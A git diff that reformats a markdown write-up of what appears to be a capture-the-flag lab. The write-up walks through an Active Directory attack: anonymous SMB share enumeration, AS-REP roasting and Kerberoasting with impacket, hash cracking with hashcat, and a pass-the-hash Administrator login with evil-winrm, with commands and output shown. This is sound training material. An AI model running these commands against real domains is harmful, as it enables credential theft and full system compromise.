@@ -73,12 +73,11 @@ smbmap -H 10.10.154.123 -u anonymous
         SYSVOL                                                  NO ACCESS       Logon server share 
         VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
         VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
-```        
-
+```
 
 * **Get all file from shared folder**
 
-```shell    
+```shell
 smbclient //10.10.154.123/VulnNet-Enterprise-Anonymous -N
 Try "help" to get a list of possible commands.
 smb: \> ls -la
@@ -177,9 +176,10 @@ t-skid
 j-goldenhand
 j-leet
 ```
+
 * **On port  88/tcp   open  kerberos-sec  service**
 
-⇒ Retrieving hashes using ASREPRoast(https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
+⇒ Retrieving hashes using ASREPRoast(<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast>)
 
 ```shell
 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile ./user.txt -no-pass -dc-ip 10.10.154.123                                                 1 ⨯
@@ -195,9 +195,9 @@ $krb5asrep$23$t-skid@VULNNET-RST:[REDACTED]
 [-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
  ```
- 
+
 * **Find hash identify with name-that-hash**
- 
+
 ```shell
  name-that-hash -f hash
 
@@ -225,6 +225,7 @@ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
 ```
 
 ## Keberoasting
+
 * **The credential that got from hash was for Remote IPC.**
 
 Use these to Kerberoast and obtain credentials for other services that running.
@@ -306,6 +307,7 @@ Administrator:500:[REDACTED]
 ```
 
 * **Login as Administrator**
+
 ```shell
 evil-winrm -u administrator -H hash -i 10.10.86.216
                                         
@@ -319,18 +321,5 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
+
 **GOT SYSTEM FLAG**
-
-
-
-
-
-
-
-
-
-
-
-
-
-
